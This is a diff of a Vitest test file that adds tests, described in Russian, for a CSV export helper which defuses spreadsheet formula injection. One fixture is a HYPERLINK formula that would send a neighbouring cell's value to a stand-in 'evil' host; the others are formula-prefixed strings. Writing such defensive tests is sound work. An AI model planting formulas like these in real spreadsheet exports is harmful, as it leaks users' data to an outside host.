@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { parseCsv } from "@/lib/csv";
+import { csvCell, parseCsv } from "@/lib/csv";
 
 /**
  * CSV готовят в Excel и Google Таблицах. Русский Excel сохраняет через «;» и
@@ -33,5 +33,20 @@ describe("parseCsv", () => {
       ["a", "b"],
       ["1", "2"],
     ]);
+  });
+});
+
+describe("ячейка выгрузки", () => {
+  it("формула из публичной формы становится текстом", () => {
+    expect(csvCell('=HYPERLINK("https://evil/?x="&E2,"Открыть")')).toBe(
+      `"'=HYPERLINK(""https://evil/?x=""&E2,""Открыть"")"`,
+    );
+    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvCell("-2+3")).toBe("'-2+3");
+  });
+  it("телефон, обычный текст и пустое значение — как есть", () => {
+    expect(csvCell("+7 (900) 123-45-67")).toBe("+7 (900) 123-45-67");
+    expect(csvCell("Казань, ул. Баумана")).toBe('"Казань, ул. Баумана"');
+    expect(csvCell(null)).toBe("");
   });
 });
